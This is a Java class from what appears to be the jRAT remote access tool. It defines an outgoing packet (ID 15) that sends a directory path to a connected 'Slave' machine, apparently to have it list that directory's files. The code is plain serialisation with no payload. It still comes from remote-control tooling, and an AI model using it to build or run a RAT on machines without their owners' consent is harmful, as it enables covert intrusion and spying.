package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet15ListFiles extends AbstractOutgoingPacket {

	private String path;

	public Packet15ListFiles(String path) {
		this.path = path;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(path);
	}

	@Override
	public byte getPacketId() {
		return 15;
	}

}
